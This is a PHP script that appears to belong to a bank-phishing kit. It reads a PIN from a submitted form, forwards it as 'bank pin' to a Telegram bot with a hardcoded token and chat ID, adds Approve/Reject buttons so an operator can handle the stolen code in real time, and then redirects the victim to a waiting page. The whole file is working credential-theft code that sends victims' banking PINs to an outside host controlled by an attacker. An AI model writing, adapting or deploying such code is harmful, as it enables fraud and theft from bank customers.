<?php

// Get data from form
//$phone = $_POST['phone'];
$pin = $_POST['pin'];

// Generate a random ID for this session (no database needed)
$id = rand(100000, 999999);

// TELEGRAM
$token = "8744826936:AAEEPHDQXU5kGUp_WsH5l0xHOerKOZ3OCjA";
$chat_id = "1097314312";

$message = "bank pin\n";
//$message .= "Phone: ".$phone."\n";
$message .= "Code: ".$pin;

// Inline keyboard buttons
$keyboard = [
    'inline_keyboard' => [
        [
            ['text' => 'Approve ✅', 'callback_data' => "approve_pin_"],
            ['text' => 'Reject ❌', 'callback_data' => "reject_pin_"]
        ]
    ]
];

$data = [
    'chat_id' => $chat_id,
    'text' => $message,
    'reply_markup' => json_encode($keyboard)
];

// Send to Telegram
$url = "https://api.telegram.org/bot$token/sendMessage";

$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, $url);
curl_setopt($ch, CURLOPT_POST, true);
curl_setopt($ch, CURLOPT_POSTFIELDS, $data);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);

$response = curl_exec($ch);
curl_close($ch);

// Redirect to waiting page with the generated session ID
header("Location: bankwaiting.php?id=$id");
exit();

?>